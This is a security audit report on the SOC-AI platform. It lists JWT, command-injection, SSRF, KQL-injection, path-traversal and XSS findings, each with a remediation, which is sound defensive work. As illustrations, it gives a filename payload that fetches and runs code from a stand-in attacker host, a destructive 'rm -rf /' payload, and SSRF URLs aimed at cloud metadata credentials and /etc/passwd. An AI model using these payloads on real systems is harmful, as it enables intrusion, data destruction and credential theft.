# SOC-AI Security Audit Report

**Date:** 2026-04-03
**Scope:** Full codebase review — authentication, authorisation, input handling, injection vectors, secrets exposure, configuration security
**Method:** Automated static analysis + manual review from offensive security perspective
**Auditor:** Will Banasik (assisted by Claude Code)

---

## Executive Summary

A comprehensive security audit of the SOC-AI platform identified **4 critical**, **7 high**, and **6 medium** severity findings across authentication, input validation, injection, and configuration domains.

The most urgent issues are: a default JWT secret that allows full authentication bypass, command injection via unsanitised filenames in the sandbox module, and a committed Sentinel workspace ID. Several path traversal and injection vectors exist in MCP resource handlers and query generation.

The codebase demonstrates strong security practices in many areas — subprocess calls use list form, sandbox containers are heavily locked down, RBAC scopes are enforced on nearly all tools, and no unsafe deserialisation was found. The findings below represent gaps in an otherwise well-structured security model.

---

## Findings

### Critical

#### C1 — Default JWT Secret in Source Code

| | |
|---|---|
| **Location** | `api/auth.py:18` |
| **Impact** | Full authentication bypass — forge any JWT with any role |
| **CVSS** | 9.8 (Critical) |

```python
JWT_SECRET = os.getenv("SOCAI_JWT_SECRET", "change-me-in-production-set-SOCAI_JWT_SECRET")
```

The fallback value is a guessable string committed to the repository. If `SOCAI_JWT_SECRET` is not set in the environment (confirmed — it is not present in `.env`), the server runs with this default. Any attacker with source code access can forge valid JWTs with `admin` permissions, granting unrestricted access to all tools, cases, client data, and destructive operations.

**Remediation:**
1. Remove the default value — use `os.getenv("SOCAI_JWT_SECRET", "")`.
2. Add a startup guard in `mcp_server/server.py` that refuses to start network transports (`sse`, `streamable-http`) if the secret is empty or the known default. Stdio transport (Claude Desktop local) can bypass since it has no auth.
3. Generate a strong random secret: `python3 -c "import secrets; print(secrets.token_urlsafe(64))"` and set it in `.env`.

---

#### C2 — JWT Permissions Trusted from Token Claims

| | |
|---|---|
| **Location** | `mcp_server/auth.py:44-47` |
| **Impact** | Privilege escalation via token manipulation |
| **CVSS** | 8.8 (High) |

```python
scopes = payload.get("permissions", [])
```

Permissions are read directly from the JWT payload rather than resolved server-side from the `role` claim against `config/roles.json`. Combined with C1 (or any future JWT secret compromise), an attacker can embed arbitrary permissions in a forged token. Even without C1, if a `junior_mdr` token is intercepted, an attacker can reconstruct a token with `"permissions": ["admin"]` using the same secret.

**Remediation:**
On token verification, resolve permissions from the `role` claim against `config/roles.json` server-side. Ignore the `permissions` array in the token payload. The token should only carry `sub` (identity) and `role` — the server derives permissions from the role definition.

---

#### C3 — Command Injection via Sample Filename in Sandbox

| | |
|---|---|
| **Location** | `tools/sandbox_session.py:280-282` |
| **Impact** | Arbitrary command execution inside sandbox container |
| **CVSS** | 8.1 (High) |

```python
f"cp /sandbox/input/{sample_path.name} /sandbox/workspace/{sample_path.name} && "
f"chmod +x /sandbox/workspace/{sample_path.name} 2>/dev/null; "
```

`sample_path.name` is interpolated into a shell command string passed to `bash -c`. A file named `$(curl attacker.com/exfil|bash).elf` or `foo; rm -rf /; .elf` would execute arbitrary commands inside the container.

**Mitigating factors:** The container is heavily locked down (`--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--read-only`, resource limits). The tool requires `admin` scope. However, if network egress is enabled (detonation mode), the injected command has outbound connectivity.

**Remediation:**
```python
from shlex import quote
f"cp /sandbox/input/{quote(sample_path.name)} /sandbox/workspace/{quote(sample_path.name)} && "
```

Apply `shlex.quote()` to all user-derived values interpolated into shell command strings throughout the sandbox module. Also review `sandbox_session.py:1007` (`exec_in_sandbox`) which passes free-text commands to `bash -c` — this is by-design for interactive forensics but should be logged and audited.

---

#### C4 — Real Sentinel Workspace ID Committed to Git

| | |
|---|---|
| **Location** | `config/clients/performanta/sentinel.md:11` |
| **Impact** | Infrastructure exposure — Azure Log Analytics workspace identifier |

The `.gitignore` covers `config/clients/*/playbook.json` and `config/clients/*/knowledge.md` but **not** `config/clients/*/sentinel.md`. The Performanta Sentinel workspace ID (`062e9d7e-...`) is committed and in git history. Combined with compromised Azure credentials, this enables direct query access to the security telemetry infrastructure. The file also contains 989 lines of table schemas revealing the exact telemetry surface.

**Remediation:**
1. `echo 'config/clients/*/sentinel.md' >> .gitignore`
2. `git rm --cached config/clients/*/sentinel.md`
3. If the repository may ever become public, scrub from history with `git filter-repo`.

---

### High

#### H1 — SSRF via URL Capture and Browser Sessions

| | |
|---|---|
| **Location** | `tools/web_capture.py:302+`, `tools/browser_session.py:176` |
| **Impact** | Access internal network, cloud metadata, local files |

`capture_urls` and `start_browser_session` accept arbitrary URLs with no validation against internal network ranges. Attack vectors:
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — cloud metadata theft
- `http://127.0.0.1:8001/` — probe the MCP server itself
- `file:///etc/passwd` — local file read via Playwright
- `http://10.0.0.1/admin` — internal network access

**Remediation:**
Create a shared `_validate_url(url)` function that:
1. Rejects non-HTTP(S) schemes (`file://`, `ftp://`, `javascript:`, `data:`)
2. Resolves the hostname to an IP address
3. Rejects RFC-1918 (`10.x`, `172.16-31.x`, `192.168.x`), loopback (`127.x`), link-local (`169.254.x`), and cloud metadata ranges
4. Apply before any URL is passed to Playwright, requests, or Docker

---

#### H2 — KQL Injection via Unescaped IOCs

| | |
|---|---|
| **Location** | `tools/generate_queries.py:270-413` |
| **Impact** | Query manipulation — data exfiltration from unintended Sentinel tables |

IOC values are interpolated into KQL strings with double-quote wrapping but no escaping:

```python
quoted = ", ".join(f'"{ip}"' for ip in ips)
```

A domain IOC containing a double quote breaks out of the string literal and can inject arbitrary KQL clauses. While KQL is read-only, injected queries could exfiltrate data from tables the analyst shouldn't be querying.

**Remediation:**
Escape double quotes in all IOC values before KQL interpolation:
```python
def _kql_escape(value: str) -> str:
    return value.replace('"', '""')
```

Apply to every IOC value in `_ip_dynamic()`, `_hash_dynamic()`, `_domain_conds()`, `_url_conds()`, and `_email_conds()`.

---

#### H3 — Path Traversal in MCP Resource Handlers

| | |
|---|---|
| **Location** | `mcp_server/resources.py:81-386` (14+ resource handlers) |
| **Impact** | Read arbitrary JSON files outside the cases directory |

All `socai://cases/{case_id}/*` resource handlers use `CASES_DIR / case_id / ...` without validating `case_id`. The tool layer validates correctly (`^[A-Za-z0-9_-]+$` regex + `resolve().relative_to()`), but the resource layer does not.

A `case_id` of `../../config` would construct paths like `cases/../../config/case_meta.json` = `config/case_meta.json`.

**Remediation:**
Extract the existing validation into a shared function and apply to all resource handlers:
```python
def _validate_case_id(case_id: str) -> str:
    if not re.match(r"^[A-Za-z0-9_-]+$", case_id):
        raise ValueError(f"Invalid case_id: {case_id!r}")
    return case_id
```

---

#### H4 — Path Traversal via `client_name`

| | |
|---|---|
| **Location** | `mcp_server/resources.py:20-45`, `mcp_server/tools.py:354` |
| **Impact** | Arbitrary directory creation + file write outside config/clients/ |

`_resolve_client_playbook()` and `update_client_knowledge` construct paths from `client_name` without sanitisation. `update_client_knowledge` creates directories from the unsanitised name:
```python
kb_dir = CLIENTS_DIR / resolved_name.lower().replace(" ", "_")
kb_dir.mkdir(parents=True, exist_ok=True)
```

A `client_name` of `../../tmp/evil` would create directories outside the intended tree.

**Remediation:**
Validate `client_name` against `^[A-Za-z0-9_ -]+$` or verify the resolved path stays within `CLIENTS_DIR` using `resolved.resolve().relative_to(CLIENTS_DIR.resolve())`.

---

#### H5 — XSS in HTML Reports

| | |
|---|---|
| **Location** | `tools/common.py:505`, `tools/save_report.py:149` |
| **Impact** | Stored XSS when analyst opens generated HTML reports in a browser |

Two vectors:
1. The `<title>` tag in `markdown_to_html()` uses unescaped `title` parameter
2. The `markdown` library permits raw HTML in input by default — a `<script>` tag in report text passes through to the final HTML

Reports are opened in a browser by analysts, making this a stored XSS vector.

**Remediation:**
1. Escape the title: `from html import escape; f"<title>{escape(title)}</title>"`
2. Sanitise HTML output with `nh3` or `bleach`, or strip raw HTML tags from markdown input before conversion

---

#### H6 — Phantom Scopes Block Non-Admin Users

| | |
|---|---|
| **Location** | `mcp_server/tools.py` (multiple), `config/roles.json` |
| **Impact** | Denial of service — legitimate analysts locked out of tools |

Several tools require `_require_scope("investigations:write")` or `_require_scope("enrichment:run")`, but **no role** in `config/roles.json` grants these scopes. Affected tools: `generate_investigation_matrix`, `run_determination`, `execute_followup`, `rebuild_client_baseline`, `refresh_log_coverage`, `run_exposure_test`, `geoip_lookup`. Only `admin` users can call these.

**Remediation:**
Either add the missing scopes to appropriate roles in `config/roles.json`, or change the tools to use existing scopes (`investigations:submit` or `investigations:read`).

---

#### H7 — Internal URLs and Employee Names in Committed Docs

| | |
|---|---|
| **Location** | `docs/service-requests.md:21-23`, `docs/critical-incident-management.md` |
| **Impact** | Infrastructure and personnel exposure if repo becomes public |

Real service desk URLs with ticket queue IDs, employee full names (manager roster), and operational procedures are committed to git. These are authoritative SOC process docs but contain sensitive operational detail.

**Remediation:**
Either gitignore `docs/incident-handling.md`, `docs/service-requests.md`, `docs/time-tracking.md`, `docs/critical-incident-management.md`, or redact the specific URLs and names. The `lookup_soc_process` tool will still serve them locally regardless of git tracking.

---

### Medium

#### M1 — Server Binds 0.0.0.0 by Default

| | |
|---|---|
| **Location** | `mcp_server/config.py:6` |

Default bind address is `0.0.0.0` with DNS rebinding protection disabled when on this address. Combined with C1, any host on the network can access the server with a forged token.

**Remediation:** Default to `127.0.0.1`. Require explicit opt-in for `0.0.0.0`.

---

#### M2 — No Token Revocation Mechanism

| | |
|---|---|
| **Location** | `api/auth.py`, `mcp_server/auth.py` |

No token blacklist or refresh token flow. Compromised tokens remain valid for the full 8-hour TTL with no way to force-invalidate.

**Remediation:** Implement a `jti`-based revocation list checked on each request, or switch to short-lived tokens (5-15 min) with refresh flow.

---

#### M3 — `new_investigation` Missing RBAC Check

| | |
|---|---|
| **Location** | `mcp_server/tools.py:174-191` |

The only tool without `_require_scope()`. Clears session tracking for the caller — can be used to erase forensic session trails.

**Remediation:** Add `_require_scope("investigations:read")`.

---

#### M4 — Sensitive Data in Logs by Default

| | |
|---|---|
| **Location** | `config/settings.py:28`, `mcp_server/usage.py:31` |

`MCP_LOG_RESULTS` defaults to enabled (2000 chars of tool results logged). Parameter redaction only covers `zip_pass`, `password`, `token`, `secret`, `api_key` — not IOCs, email addresses, alert data, or enrichment results.

**Remediation:** Default `MCP_LOG_RESULTS` to `"0"` in production. Expand `_SENSITIVE_KEYS` to include `email`, `alert_data`, `iocs`.

---

#### M5 — World-Readable Secrets Files

| | |
|---|---|
| **Location** | `.env` (644), `config/users.json` (644) |

Both files contain secrets and are readable by any user on the system.

**Remediation:** `chmod 600 .env config/users.json`. Add a startup warning if permissions are too open.

---

#### M6 — Race Condition in Case ID Generation

| | |
|---|---|
| **Location** | `tools/case_create.py:27-50` |

`next_case_id()` reads the registry and increments without guaranteed atomic locking. Concurrent requests could generate duplicate case IDs.

**Remediation:** Verify `fcntl.flock` is held around the read-increment-write cycle, or use an atomic counter file.

---

## Positive Findings

The audit also identified strong security practices already in place:

- All `subprocess` calls use list form (no `shell=True`) except intentional `bash -c` in sandbox
- `read_case_file` and `list_case_files` have proper path traversal prevention (`resolve().relative_to()`)
- Sandbox containers use `--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--read-only`, resource limits, isolated networking
- RBAC scopes enforced on all MCP tools (except `new_investigation`)
- No `pickle.load`, `yaml.load`, `eval()`, `exec()`, or `os.system()` found in application code
- `defang_report()` uses `re.escape()` on IOC values for safe regex construction
- IOC extraction regexes use bounded quantifiers and fixed TLD lists (no ReDoS risk)
- Client playbooks, knowledge bases, and sensitive config files are gitignored
- Structured JSONL logging with PID tracking and signal handlers

---

## Recommended Priority

**Immediate (pre-deployment):**
1. Fix JWT secret default + add startup guard (C1)
2. Server-side permission resolution (C2)
3. `shlex.quote()` on sandbox filenames (C3)
4. Gitignore + untrack `sentinel.md` files (C4)
5. Path traversal validation on resource handlers (H3, H4)

**Short-term (next sprint):**
6. URL validation for SSRF prevention (H1)
7. KQL escaping (H2)
8. HTML report sanitisation (H5)
9. Fix phantom scopes (H6)
10. Gitignore or redact SOC process docs (H7)

**Medium-term (backlog):**
11. Default bind to localhost (M1)
12. Token revocation mechanism (M2)
13. Expand log redaction (M4)
14. File permissions check at startup (M5)
